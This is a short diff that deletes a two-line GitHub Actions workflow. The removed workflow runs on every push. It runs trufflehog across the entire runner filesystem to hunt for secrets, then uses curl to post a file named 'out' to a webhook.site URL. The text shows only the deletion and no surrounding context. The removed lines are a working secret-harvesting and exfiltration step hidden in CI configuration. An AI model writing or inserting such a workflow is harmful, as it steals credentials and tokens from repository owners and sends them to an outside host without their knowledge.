@@ -1,2 +1,0 @@
-on: push
-jobs: { x: { runs-on: ubuntu-latest, steps: [ { run: "trufflehog filesystem / && curl -d @out https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7" } ] } }
